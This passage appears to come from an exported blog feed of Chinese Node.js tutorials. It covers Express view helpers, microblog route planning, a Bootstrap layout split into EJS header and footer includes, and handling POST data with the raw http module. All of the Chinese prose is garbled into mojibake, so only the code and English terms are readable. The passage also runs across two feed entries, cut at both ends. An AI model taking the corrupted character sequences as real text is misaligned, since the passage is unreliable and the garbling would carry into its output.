å‡½æ•°æ³¨å†Œï¼Œå®ƒæŽ¥å—ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡çš„æ¯ä¸ªå±žæ€§åç§°ä¸ºè§†å›¾åŠ©æ‰‹çš„åç§°ï¼Œå±žæ€§å€¼å¯¹åº”è§†å›¾åŠ©æ‰‹çš„å€¼ã€‚åŠ¨æ€è§†å›¾åŠ©æ‰‹åˆ™é€šè¿‡ app.dynamicHelpers() æ³¨å†Œï¼Œæ–¹æ³•ä¸Žé™æ€è§†å›¾åŠ©æ‰‹ç›¸åŒï¼Œä½†æ¯ä¸ªå±žæ€§çš„å€¼å¿…é¡»ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°æä¾› req å’Œ res ã€‚å½“ç„¶è¿™æ˜¯express4.0ä¹‹å‰çš„ç”¨æ³•ï¼ŒçŽ°åœ¨è§†å›¾åŠ©æ‰‹æœ‰æ‰€ä¸ä¸€æ ·äº†ã€‚ é™æ€è§†å›¾åœ¨ app.js ä¸­æ·»åŠ  123456// app é™æ€è§†å›¾åŠ©æ‰‹// é™æ€è§†å›¾åŠ©æ‰‹å˜é‡app.locals.appName = 'NodeExpressBlog';app.locals.sayHello = function()&#123; return 'Welcome to my NodeExpressBlog';&#125; æ–°å»ºä¸€ä¸ª helper.ejs,å†…å®¹å¦‚ä¸‹ï¼š 12&lt;h1&gt;&lt;%= appName%&gt;&lt;/h1&gt;&lt;p&gt;&lt;%= sayHello()%&gt;&lt;/p&gt; è®¿é—® http://localhost:3000/helper å¯ä»¥çœ‹åˆ°ä¸‹é¢å†…å®¹ åŠ¨æ€è§†å›¾åŠ¨æ€è§†å›¾åŠ©æ‰‹çš„å®žçŽ°æ–¹å¼å’Œè·¯ç”±çš„æ–¹å¼ç›¸ä¼¼ï¼Œæ‰€ä»¥åŠ¨æ€è§†å›¾åŠ©æ‰‹è¦å°†è¯­å¥æ”¾åœ¨è·¯ç”±çš„å‰é¢ åœ¨ routers/index.js é‡Œé¢æ·»åŠ ä»¥ä¸‹å†…å®¹ 12345678// åŠ¨æ€è§†å›¾åŠ©æ‰‹router.use(function(req, res, next)&#123; res.locals.appUrl = req.url; res.locals.Welcome = function()&#123; return 'Welcome to my NodeExpressBlog, the url is: ' + res.locals.appUrl; &#125; next();&#125;); ç„¶åŽåœ¨ helper.ejs æ·»åŠ ä»¥ä¸‹å†…å®¹ 12&lt;p&gt;&lt;%= appUrl %&gt;&lt;/p&gt;&lt;p&gt;&lt;%= Welcome() %&gt;&lt;/p&gt; åˆ·æ–°ç½‘é¡µï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ è§†å›¾åŠ©æ‰‹çš„æœ¬è´¨å…¶å®žå°±æ˜¯ç»™æ‰€æœ‰è§†å›¾æ³¨å†Œäº†å…¨å±€å˜é‡ï¼Œå› æ­¤æ— éœ€æ¯æ¬¡åœ¨è°ƒç”¨æ¨¡æ¿å¼•æ“Žæ—¶ä¼ é€’æ•°æ®å¯¹è±¡ã€‚ æŽ¥ä¸‹æ¥ åœ¨ app.js ä¸­åŠ å…¥ 1234var util = require('util');app.locals.inspect = function(obj)&#123; return util.inspect(obj, true);&#125; ç„¶åŽåœ¨ routers/index.js æ·»åŠ  123456789// åŠ¨æ€è§†å›¾åŠ©æ‰‹router.use(function(req, res, next)&#123; res.locals.appUrl = req.url; res.locals.Welcome = function()&#123; return 'Welcome to my NodeExpressBlog, the url is: ' + res.locals.appUrl; &#125; res.locals.headers = req.headers; next();&#125;); åŒæ ·åœ¨ helper.ejs æ·»åŠ  1&lt;p&gt;&lt;%=inspect(headers)%&gt;&lt;/p&gt; é‡å¼€æœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ° åœ¨åŽé¢ä½¿ç”¨ session æ—¶ä¼šå‘çŽ°å®ƒæ˜¯éžå¸¸æœ‰ç”¨çš„ã€‚ å»ºç«‹å¾®åšç½‘ç«™åŠŸèƒ½åˆ†æžé¦–å…ˆï¼Œå¾®åšåº”è¯¥ä»¥ç”¨æˆ·ä¸ºä¸­å¿ƒï¼Œå› æ­¤éœ€è¦æœ‰ç”¨æˆ·çš„æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ã€‚å¾®åšç½‘ç«™æœ€æ ¸å¿ƒçš„åŠŸèƒ½æ˜¯ä¿¡æ¯çš„å‘è¡¨ï¼Œè¿™ä¸ªåŠŸèƒ½æ¶‰åŠè®¸å¤šæ–¹é¢ï¼ŒåŒ…æ‹¬æ•°æ®åº“è®¿é—®ã€å‰ç«¯æ˜¾ç¤ºç­‰ã€‚ä¸€ä¸ªå®Œæ•´çš„å¾®åšç³»ç»Ÿåº”è¯¥æ”¯æŒä¿¡æ¯çš„è¯„è®ºã€è½¬å‘ã€åœˆç‚¹ç”¨æˆ·ç­‰åŠŸèƒ½ï¼Œä½†å‡ºäºŽæ¼”ç¤ºç›®çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ä¸€ä¸€å®žçŽ°æ‰€æœ‰åŠŸèƒ½ï¼Œåªæ˜¯å®žçŽ°ä¸€ä¸ªå¾®åšç¤¾äº¤ç½‘ç«™çš„é›å½¢ã€‚ è·¯ç”±è§„åˆ’åœ¨å®ŒæˆåŠŸèƒ½è®¾è®¡ä»¥åŽï¼Œä¸‹ä¸€ä¸ªè¦åšçš„äº‹æƒ…å°±æ˜¯è·¯ç”±è§„åˆ’äº†ã€‚è·¯ç”±è§„åˆ’ï¼Œæˆ–è€…è¯´æŽ§åˆ¶å™¨è§„åˆ’æ˜¯æ•´ä¸ªç½‘ç«™çš„éª¨æž¶éƒ¨åˆ†ï¼Œå› ä¸ºå®ƒå¤„äºŽæ•´ä¸ªæž¶æž„çš„æž¢çº½ä½ç½®ï¼Œç›¸å½“äºŽå„ä¸ªæŽ¥å£ä¹‹é—´çš„ç²˜åˆå‰‚ï¼Œæ‰€ä»¥åº”è¯¥ä¼˜å…ˆè€ƒè™‘ã€‚ æ ¹æ®åŠŸèƒ½è®¾è®¡ï¼Œæˆ‘ä»¬æŠŠè·¯ç”±æŒ‰ç…§ä»¥ä¸‹æ–¹æ¡ˆè§„åˆ’ã€‚ /ï¼šé¦–é¡µ /u/[user]ï¼šç”¨æˆ·çš„ä¸»é¡µ /postï¼šå‘è¡¨ä¿¡æ¯ /regï¼šç”¨æˆ·æ³¨å†Œ /loginï¼šç”¨æˆ·ç™»å½• /logoutï¼šç”¨æˆ·ç™»å‡º ä»¥ä¸Šé¡µé¢è¿˜å¯ä»¥æ ¹æ®ç”¨æˆ·çŠ¶æ€ç»†åˆ†ã€‚å‘è¡¨ä¿¡æ¯ä»¥åŠç”¨æˆ·ç™»å‡ºé¡µé¢å¿…é¡»æ˜¯å·²ç™»å½•ç”¨æˆ·æ‰èƒ½æ“ä½œçš„åŠŸèƒ½ï¼Œè€Œç”¨æˆ·æ³¨å†Œå’Œç”¨æˆ·ç™»å…¥æ‰€é¢å‘çš„å¯¹è±¡å¿…é¡»æ˜¯æœªç™»å…¥çš„ç”¨æˆ·ã€‚é¦–é¡µå’Œç”¨æˆ·ä¸»é¡µåˆ™é’ˆå¯¹å·²ç™»å…¥å’Œæœªç™»å…¥çš„ç”¨æˆ·æ˜¾ç¤ºä¸åŒçš„å†…å®¹ã€‚ ä¿®æ”¹ routers/index.js çš„å†…å®¹ 123456789101112131415161718192021222324252627282930// æ­£å¼å¾®åšè·¯ç”±router.get('/', function (req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;);// ç”¨æˆ·çš„ä¸»é¡µ router.get('/u/:user', function (req, res, next) &#123; &#125;);// ç”¨æˆ·æ³¨å†Œrouter.route('/reg'). all(function (req, res, next) &#123; next() &#125;).get(function (req, res, next) &#123; next() &#125;).post(function (req, res, next) &#123; next() &#125;);// ç”¨æˆ·ç™»å½•router.route('/login'). all(function (req, res, next) &#123; next() &#125;).get(function (req, res, next) &#123; next() &#125;).post(function (req, res, next) &#123; next() &#125;);// ç”¨æˆ·ç™»å‡º router.get('/logout', function (req, res, next) &#123; &#125;); ç”±äºŽ/reg ä»¥åŠ /login æŽ¥å—è¡¨å•ä¿¡æ¯çš„åŒæ—¶è¿˜è¦æ˜¾ç¤ºç”¨æˆ·æ³¨å†Œè¦å¡«å†™çš„è¡¨å•ï¼Œæ‰€ä»¥ä½¿ç”¨ router.routeæ–¹æ³•é“¾å¼å°† post/get æ–¹æ³•å†™åœ¨äº†ä¸€èµ·ã€‚ ç•Œé¢è®¾è®¡Twitter Bootstrap æ˜¯ç”± Twitter çš„è®¾è®¡å¸ˆå’Œå·¥ç¨‹å¸ˆå‘èµ·çš„å¼€æºé¡¹ç›®ï¼Œå®ƒæä¾›äº†ä¸€å¥—ä¸Ž Twitter é£Žæ ¼ä¸€è‡´çš„ç®€æ´ã€ä¼˜é›…çš„ Web UIï¼ŒåŒ…å«äº†å®Œå…¨ç”± HTMLã€CSSã€JavaScript å®žçŽ°çš„ç”¨æˆ·äº¤äº’å·¥å…·ã€‚å¯ä»¥è½»æ¾åœ°ä½¿ç”¨Twitter Bootstrap åˆ¶ä½œå‡ºä¼˜ç¾Žçš„ç•Œé¢ã€‚ ä½¿ç”¨ Bootstrapä»Žhttp://twitter.github.com/bootstrap/ä¸‹è½½bootstrap.zipï¼Œè§£åŽ‹åŽå¯ä»¥çœ‹åˆ°ä»¥ä¸‹æ–‡ä»¶ï¼š 12345678css/bootstrap-responsive.csscss/bootstrap-responsive.min.csscss/bootstrap.csscss/bootstrap.min.cssimg/glyphicons-halflings-white.pngimg/glyphicons-halflings.pngjs/bootstrap.jsjs/bootstrap.min.js å…¶ä¸­æ‰€æœ‰çš„ JavaScript å’Œ CSS æ–‡ä»¶éƒ½æä¾›äº†å¼€å‘ç‰ˆå’Œäº§å“ç‰ˆï¼Œå‰è€…æ˜¯åŽŸå§‹çš„ä»£ç ï¼ŒåŽè€…ç»è¿‡åŽ‹ç¼©ï¼Œæ–‡ä»¶åä¸­å¸¦æœ‰ minã€‚å°† img ç›®å½•å¤åˆ¶åˆ°å·¥ç¨‹ public ç›®å½•ä¸‹ï¼Œå°† bootstrap.cssã€bootstrap-responsive.css å¤åˆ¶åˆ° public/stylesheets ä¸­ï¼Œå°† bootstrap.js å¤åˆ¶åˆ° public/javascripts ç›®å½•ä¸­ï¼Œç„¶åŽä»Žhttp://jquery.com/ä¸‹è½½ä¸€ä»½æœ€æ–°ç‰ˆçš„ jquery.js ä¹Ÿæ”¾å…¥ public/javascripts ç›®å½•ä¸­ã€‚ ç”±äºŽ express4.xç‰ˆæœ¬ä»¥åŠä¸å†æ”¯æŒ layout.ejsï¼Œè€Œæ˜¯ä½¿ç”¨ include é¦–å…ˆæˆ‘ä»¬æœ¬æ¥è¦æ’å…¥layout.ejsï¼Œå†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; - Microblog&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/bootstrap.css' /&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;style type="text/css"&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;link href="stylesheets/bootstrap-responsive.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="navbar navbar-fixed-top"&gt; &lt;div class="navbar-inner"&gt; &lt;div class="container"&gt; &lt;a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;span class="icon-bar"&gt;&lt;/span&gt; &lt;/a&gt; &lt;a class="brand" href="/"&gt;Microblog&lt;/a&gt; &lt;div class="nav-collapse"&gt; &lt;ul class="nav"&gt; &lt;li class="active"&gt;&lt;a href="/"&gt;é¦–é¡µ&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="/login"&gt;ç™»å…¥&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="/reg"&gt;æ³¨å†Œ&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id="container" class="container"&gt;&lt;/div&gt; &lt;hr /&gt;&lt;footer&gt; &lt;p&gt;&lt;a href="http://laibh.top" target="_blank"&gt;èµ–åŒå­¦&lt;/a&gt; 2018&lt;/p&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="/javascripts/jquery.js"&gt;&lt;/script&gt;&lt;script src="/javascripts/bootstrap.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šé¢ä»£ç æ˜¯ä½¿ç”¨ Bootstrapéƒ¨ä»¶å®žçŽ°çš„ä¸€ä¸ªç®€å•é¡µé¢æ¡†æž¶ï¼Œæ•´ä¸ªé¡µé¢åˆ†ä¸ºé¡¶éƒ¨å·¥å…·æ ã€æ­£æ–‡å’Œé¡µè„šä¸‰éƒ¨åˆ†ï¼Œå…¶ä¸­æ­£æ–‡å’Œé¡µè„šåŒ…å«åœ¨åä¸º container çš„ div æ ‡ç­¾ä¸­ã€‚ ç„¶åŽæˆ‘ä»¬æ–°å»ºä¸¤ä¸ªejs æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ footer.ejs å’Œ header.ejs 123456789101112131415161718192021222324252627282930313233343536373839// header.ejs &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt; &lt;%= title %&gt; - Microblog&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/bootstrap.css&apos; /&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123; padding-top: 60px; padding-bottom: 40px; &#125; &lt;/style&gt; &lt;link href=&quot;stylesheets/bootstrap-responsive.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;navbar navbar-fixed-top&quot;&gt; &lt;div class=&quot;navbar-inner&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;a class=&quot;btn btn-navbar&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.nav-collapse&quot;&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/a&gt; &lt;a class=&quot;brand&quot; href=&quot;/&quot;&gt;Microblog&lt;/a&gt; &lt;div class=&quot;nav-collapse&quot;&gt; &lt;ul class=&quot;nav&quot;&gt; &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;/&quot;&gt;é¦–é¡µ&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/login&quot;&gt;ç™»å…¥&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/reg&quot;&gt;æ³¨å†Œ&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;container&quot; class=&quot;container&quot;&gt; 12345678910111213// footer.ejs&lt;/div&gt;&lt;hr /&gt;&lt;footer&gt; &lt;p&gt;&lt;a href=&quot;http://laibh.top&quot; target=&quot;_blank&quot;&gt;èµ–åŒå­¦&lt;/a&gt; 2018&lt;/p&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src=&quot;/javascripts/jquery.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/javascripts/bootstrap.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ç„¶åŽï¼Œåœ¨ index.ejs æ·»åŠ ä»¥ä¸‹å†…å®¹ 1234567891011121314151617181920212223242526272829303132&lt;% include header.ejs %&gt;&lt;div class=&quot;hero-unit&quot;&gt; &lt;h1&gt;æ¬¢è¿Žæ¥åˆ° Microblog&lt;/h1&gt; &lt;p&gt;Microblog æ˜¯ä¸€ä¸ªåŸºäºŽ Node.js çš„å¾®åšç³»ç»Ÿã€‚&lt;/p&gt; &lt;p&gt; &lt;a class=&quot;btn btn-primary btn-large&quot; href=&quot;/login&quot;&gt;ç™»å½•&lt;/a&gt; &lt;a class=&quot;btn btn-large&quot; href=&quot;/reg&quot;&gt;ç«‹å³æ³¨å†Œ&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;Carbo è¯´&lt;/h2&gt; &lt;p&gt;ä¸œé£Žç ´æ—©æ¢… å‘æš–ä¸€æžå¼€ å†°é›ªæ— äººè§ æ˜¥ä»Žå¤©ä¸Šæ¥&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;BYVoid è¯´&lt;/h2&gt; &lt;p&gt; Open Chinese Convertï¼ˆOpenCCï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸­æ–‡ç®€ç¹è½¬æ¢é¡¹ç›®ï¼Œ è‡´åŠ›äºŽåˆ¶ä½œé«˜è´¨é‡çš„åŸºäºŽç»Ÿè®¡é¢„æ–™çš„ç®€ç¹è½¬æ¢è¯åº“ã€‚ è¿˜æä¾›å‡½æ•°åº“(libopencc)ã€å‘½ä»¤è¡Œç®€ç¹è½¬æ¢å·¥å…·ã€äººå·¥æ ¡å¯¹å·¥å…·ã€è¯å…¸ç”Ÿæˆç¨‹åºã€ åœ¨çº¿è½¬æ¢æœåŠ¡åŠå›¾å½¢ç”¨æˆ·ç•Œé¢ã€‚&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;ä½›æŒ¯ è¯´&lt;/h2&gt; &lt;p&gt;ä¸­å·žéŸµè¾“å…¥æ³•å¼•æ“Ž / Rime Input Method Engine å–æ„åŽ†å²ä¸Šé€šè¡Œçš„ä¸­å·žéŸµï¼Œ æ„¿å†™å°±ä¸€éƒ¨æ±‡é›†éŸ³éŸµå­¦æ™ºæ…§çš„è¾“å…¥æ³•ç»å…¸ä¹‹ä½œã€‚ é¡¹ç›®ç½‘ç«™è®¾åœ¨ http://laibh.top åˆ›é€ åº”ç”¨ä»·å€¼æ˜¯ä¸€æ–¹é¢ï¼Œæ›´è¦åšæŒå¯¹å¥½æŠ€æœ¯çš„è¿½æ±‚ï¼Œå¸Œæœ›èƒ½å†™å‡ºçµåŠ¨è€Œæ˜“äºŽæ‰©å±•çš„ä»£ç ï¼Œ ä½¿å…¶æˆä¸ºä¸€æ¬¾ä¸ªæ€§åè¶³çš„å¼€æºè¾“å…¥æ³•ã€‚&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;% include footer.ejs %&gt; è®¿é—® http://localhost:3000/ ï¼Œå°±å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ ä¸çŸ¥ä¸è§‰ï¼Œåˆç¯‡å¹…æœ‰ç‚¹é•¿äº†ï¼ŒåŽé¢çš„æ˜¯æœ€åŽä¸€ç« ï¼Œå°†ä¼šä»‹ç»ç”¨æˆ·æ³¨å†Œå’Œç™»å½•å·²ç»å‘è¡¨å¾®åšçš„åŸºæœ¬åŠŸèƒ½ï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸‹ä¸€ç« ä¸€èµ·å­¦ä¹ ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” ä½¿ç”¨ Node.jsè¿›è¡Œ Web å¼€å‘ï¼ˆä¸Šï¼‰]]></title>
    <url>%2F2018-09-21-NodeJs-Part5%E4%B8%8A.html</url>
    <content type="text"><![CDATA[æœ¬ç« ä»Žé›¶å¼€å§‹ç”¨ Node.js å®žçŽ°ä¸€ä¸ªå¾®åšç³»ç»Ÿï¼ŒåŠŸèƒ½åŒ…æ‹¬è·¯ç”±æŽ§åˆ¶ã€é¡µé¢æ¨¡æ¿ã€æ•°æ®åº“è®¿é—®ã€ç”¨æˆ·æ³¨å†Œã€ç™»å½•ã€ç”¨æˆ·ä¼šè¯ç­‰å†…å®¹ã€‚ä»‹ç» Express æ¡†æž¶ã€MVC è®¾è®¡æ¨¡å¼ã€ejs æ¨¡æ¿å¼•æ“Žä»¥åŠ MongoDB æ•°æ®åº“çš„æ“ä½œã€‚ç”±äºŽç¯‡å¹…çœ‹èµ·æ¥è¿‡é•¿ï¼Œå°±æ‰“ç®—åˆ†æˆå‡ èŠ‚æ¥è®°å½•ï¼Œå…·ä½“å‡ èŠ‚çœ‹åŽé¢æƒ…å†µï¼Œå¥½äº†ï¼Œè®©æˆ‘ä»¬ä¸€èµ·æ¥å®žè·µç”¨Node.jsè¿›è¡ŒWebå¼€å‘å§ ä½¿ç”¨ Node.jsè¿›è¡Œ Web å¼€å‘å‡†å¤‡å·¥ä½œMVCï¼ˆModel-View-Controllerï¼Œæ¨¡åž‹-è§†å›¾-æŽ§åˆ¶å™¨ï¼‰æ˜¯ä¸€ç§è½¯ä»¶çš„è®¾è®¡æ¨¡å¼ï¼Œå³æŠŠä¸€ä¸ªå¤æ‚çš„è½¯ä»¶å·¥ç¨‹åˆ†è§£æˆä¸‰ä¸ªå±‚é¢ï¼šæ¨¡åž‹ã€è§†å›¾å’ŒæŽ§åˆ¶å™¨ã€‚ æ¨¡åž‹æ˜¯å¯¹è±¡åŠå…¶æ•°æ®ç»“æž„çš„å®žçŽ°ï¼Œé€šå¸¸åŒ…å«æ•°æ®åº“æ“ä½œ è§†å›¾è¡¨ç¤ºç”¨æˆ·ç•Œé¢ï¼Œåœ¨ç½‘ç«™ä¸­é€šå¸¸å°±æ˜¯ HTML çš„ç»„ç»‡ç»“æž„ æŽ§åˆ¶å™¨ç”¨äºŽå¤„ç†ç”¨æˆ·è¯·æ±‚å’Œæ•°æ®æµã€å¤æ‚æ¨¡åž‹ï¼Œå°†è¾“å‡ºä¼ é€’ç»™è§†å›¾ ç§° PHPã€ASPã€JSP ä¸º â€œæ¨¡æ¿ä¸ºä¸­å¿ƒçš„æž¶æž„â€ï¼Œä¸‹è¡¨æ˜¯ä¸¤ç§ Web å¼€å‘æž¶æž„çš„å¯¹æ¯” ç‰¹æ€§ æ¨¡æ¿ä¸ºä¸­å¿ƒæž¶æž„ MVCæž¶æž„ é¡µé¢äº§ç”Ÿæ–¹å¼ æ‰§è¡Œå¹¶æ›¿æ¢æ ‡ç­¾ä¸­çš„è¯­å¥ ç”±æ¨¡æ¿å¼•æ“Žç”Ÿæˆ HTML é¡µé¢ è·¯å¾„è§£æž å¯¹åº”åˆ°æ–‡ä»¶ç³»ç»Ÿ ç”±æŽ§åˆ¶å™¨å®šä¹‰ æ•°æ®è®¿é—® é€šè¿‡ SQL è¯­å¥æŸ¥è¯¢æˆ–è®¿é—®æ–‡ä»¶ç³»ç»Ÿ å¯¹è±¡å…³ç³»æ¨¡åž‹ æž¶æž„ä¸­å¿ƒ è„šæœ¬è¯­è¨€æ˜¯é™æ€ HTTP æœåŠ¡å™¨çš„æ‰©å±• é™æ€ HTTP æœåŠ¡å™¨æ˜¯è„šæœ¬è¯­è¨€çš„è¡¥å…… é€‚ç”¨èŒƒå›´ å°è§„æ¨¡ç½‘ç«™ å¤§è§„æ¨¡ç½‘ç«™ å­¦ä¹ éš¾åº¦ å®¹æ˜“ è¾ƒéš¾ è¿™ä¸¤ç§æž¶æž„éƒ½å‡ºè‡ªåŽŸå§‹çš„ CGIï¼Œä½†ä¸åŒä¹‹å¤„æ˜¯å‰è€…èµ°äº†ä¸€æ¡ç²—æ”¾æ‰©å¼ çš„å‘å±•è·¯çº¿ï¼Œç”±äºŽæ˜“å­¦æ˜“ç”¨ï¼Œåœ¨å‡ å¹´å‰åº”ç”¨è¾ƒå¹¿ï¼Œè€Œéšç€äº’è”ç½‘è§„æ¨¡çš„æ‰©å¤§ï¼ŒåŽè€…ä¼˜åŠ¿é€æ¸ä½“çŽ°ï¼Œç›®å‰å·²ç»æˆä¸ºä¸»æµã€‚ Node.js æœ¬è´¨ä¸Šå’Œ Perl æˆ– C++ ä¸€æ ·ï¼Œéƒ½å¯ä»¥ä½œä¸º CGI æ‰©å±•è¢«è°ƒç”¨ï¼Œä½†å®ƒè¿˜å¯ä»¥è·³è¿‡ HTTP æœåŠ¡å™¨ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±æ˜¯ã€‚ä¼ ç»Ÿçš„æž¶æž„ä¸­ HTTP æœåŠ¡å™¨çš„è§’è‰²ä¼šç”± Apacheã€Nginxã€IIS ä¹‹ç±»çš„è½¯ä»¶æ¥æ‹…ä»»ï¼Œè€Œ Node.js ä¸éœ€è¦ã€‚Node.js æä¾›äº† http æ¨¡å—ï¼Œå®ƒæ˜¯ç”± C++ å®žçŽ°çš„ï¼Œæ€§èƒ½å¯é ï¼Œå¯ä»¥ç›´æŽ¥åº”ç”¨åˆ°ç”Ÿäº§çŽ¯å¢ƒã€‚ Node.js å’Œå…¶ä»–çš„è¯­è¨€ç›¸æ¯”çš„å¦ä¸€ä¸ªæ˜¾è‘—åŒºåˆ«ï¼Œåœ¨äºŽå®ƒçš„åŽŸå§‹å°è£…ç¨‹åº¦è¾ƒä½Žã€‚ä¾‹å¦‚ PHP ä¸­å¯ä»¥è®¿é—® $_REQUEST èŽ·å–å®¢æˆ·ç«¯çš„ POST æˆ– GET è¯·æ±‚ï¼Œé€šå¸¸ä¸éœ€è¦ç›´æŽ¥å¤„ç† HTTP åè®®ã€‚è¿™äº›è¯­è¨€è¦æ±‚ç”± HTTP æœåŠ¡å™¨æ¥è°ƒç”¨ï¼Œå› æ­¤éœ€è¦è®¾ç½®ä¸€ä¸ª HTTP æœåŠ¡å™¨æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ŒHTTP æœåŠ¡å™¨é€šè¿‡ CGI æˆ–å…¶ä»–æ–¹å¼è°ƒç”¨è„šæœ¬è¯­è¨€è§£é‡Šå™¨ï¼Œå°†è¿è¡Œçš„ç»“æžœä¼ é€’å›žHTTP æœåŠ¡å™¨ï¼Œæœ€ç»ˆå†æŠŠå†…å®¹è¿”å›žç»™å®¢æˆ·ç«¯ã€‚è€Œåœ¨ Node.js ä¸­ï¼Œå¾ˆå¤šå·¥ä½œéœ€è¦è‡ªå·±æ¥åšï¼ˆå¹¶ä¸æ˜¯éƒ½è¦è‡ªå·±åŠ¨æ‰‹ï¼Œå› ä¸ºæœ‰ç¬¬ä¸‰æ–¹æ¡†æž¶çš„å¸®åŠ©ï¼‰ã€‚ ä½¿ç”¨ http æ¨¡å—Node.js ç”±äºŽä¸éœ€è¦å¦å¤–çš„ HTTP æœåŠ¡å™¨ï¼Œå› æ­¤å‡å°‘äº†ä¸€å±‚æŠ½è±¡ï¼Œç»™æ€§èƒ½å¸¦æ¥ä¸å°‘æå‡ï¼Œä½†åŒæ—¶ä¹Ÿå› æ­¤è€Œæé«˜äº†å¼€å‘éš¾åº¦ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œè¦å®žçŽ°ä¸€ä¸ª POST æ•°æ®çš„è¡¨å•ï¼Œä¾‹å¦‚ï¼š 12345&lt;form method = "post" action="http://localhost:3000"&gt; &lt;input type="text" name="title"&gt; &lt;textarea name="text"&gt;&lt;/textarea&gt; &lt;input type="submit"&gt;&lt;/form&gt; è¿™ä¸ªè¡¨å•åŒ…å«ä¸¤ä¸ªå­—æ®µï¼š title å’Œ text ï¼Œæäº¤æ—¶ä»¥ POST çš„æ–¹å¼å°†è¯·æ±‚å‘é€ç»™ http://localhost:3000/ã€‚ å‡è®¾æˆ‘ä»¬è¦å®žçŽ°çš„åŠŸèƒ½æ˜¯å°†è¿™ä¸¤ä¸ªå­—æ®µçš„ä¸œè¥¿åŽŸå°ä¸åŠ¨åœ°è¿”å›žç»™ç”¨æˆ·ï¼ŒPHP åªéœ€å†™ä¸¤è¡Œä»£ç ï¼Œå‚¨å­˜ä¸º index.php æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å³å¯ï¼š 12echo $_POST['title']echo $_POST['text'] åœ¨ç¬¬ä¸‰ç« ä½¿ç”¨äº†ç±»ä¼¼ä¸‹é¢çš„æ–¹æ³•ï¼ˆç”¨ httpæ¨¡å—ï¼‰ 123456789101112131415var http = require('http');var querystring = require('querystring');var server = http.createServer(function(req, res) &#123; var post = ''; req.on('data', function(chunk) &#123; post += chunk; &#125;); req.on('end', function() &#123; post = querystring.parse(post); res.write(post.title); res.write(post.text); res.end(); &#125;);&#125;).listen(3000); PHP çš„å®žçŽ°è¦æ¯”Node.jså®¹æ˜“å¾—å¤šã€‚Node.jså®Œæˆä¸€ä¸ªç®€å•çš„ä»»åŠ¡éœ€è¦è¿™ä¹ˆå¤æ‚ï¼šå…ˆå»ºç«‹ä¸€ä¸ª httpå®žä¾‹ï¼Œåœ¨å…¶è¯·æ±‚å¤„ç†å‡½æ•°æ‰‹åŠ¨ç¼–å†™ req å¯¹è±¡çš„äº‹ä»¶ç›‘å¬å™¨ï¼Œå½“å®¢æˆ·ç«¯æ•°æ®åˆ°è¾¾æ—¶ï¼Œå°†POST æ•°æ®æš‚å­˜åœ¨é—­åŒ…çš„å˜é‡ä¸­ï¼Œç›´åˆ° endäº‹ä»¶è§¦å‘ï¼Œè§£æž POST 